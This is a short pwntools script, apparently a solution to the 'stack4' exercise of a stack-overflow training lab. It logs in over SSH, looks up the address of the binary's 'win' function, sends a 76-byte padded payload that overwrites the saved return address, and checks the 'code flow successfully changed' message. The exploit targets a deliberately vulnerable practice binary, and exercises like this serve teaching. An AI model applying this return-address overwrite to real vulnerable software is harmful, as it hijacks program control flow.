from pwn import *

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))

e = ELF('bins/stack4')
win_addr = e.symbols['win']
log.info('win_addr: %08x', win_addr)

off = 64 + 8 + 4  # buf (64), pad/align & 0xf (8) and ebp value saved by main() (4)
payload = fit({off: win_addr})

p = s.system(args.BIN)
p.sendline(payload)

ret = p.recvline()
assert ret == 'code flow successfully changed\n'
